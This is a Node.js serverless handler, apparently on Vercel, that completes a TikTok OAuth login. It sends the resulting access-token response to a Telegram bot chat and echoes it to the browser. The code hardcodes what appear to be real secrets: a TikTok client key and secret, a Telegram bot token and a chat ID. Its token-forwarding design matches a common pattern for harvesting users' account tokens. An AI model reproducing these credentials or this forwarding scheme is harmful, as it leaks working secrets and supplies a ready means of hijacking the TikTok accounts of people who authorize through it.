const https = require('https');

const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
const TELEGRAM_CHAT_ID = '7644255708';

module.exports = async (req, res) => {
  const urlParams = new URLSearchParams(req.url.split('?')[1]);
  const code = urlParams.get('code');
  const error = urlParams.get('error');

  if (error) return res.end(`TikTok Error: ${error}`);
  if (!code) return res.end('API is working. Waiting for TikTok Code...');

  const postData = `client_key=${CLIENT_KEY}&client_secret=${CLIENT_SECRET}&code=${code}&grant_type=authorization_code&redirect_uri=https://my-tiktok-auth.vercel.app/api/auth`;

  const options = {
    hostname: 'open.tiktokapis.com',
    path: '/v2/oauth/token/',
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(postData) }
  };

  const tokenReq = https.request(options, (apiRes) => {
    let data = '';
    apiRes.on('data', (chunk) => data += chunk);
    apiRes.on('end', () => {
      const msg = `✅ بيانات تيك توك: ${data}`;
      https.get(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
      res.end(`Success! Check Telegram. Response: ${data}`);
    });
  });
  
  tokenReq.on('error', (e) => res.end(`Error: ${e.message}`));
  tokenReq.write(postData);
  tokenReq.end();
};
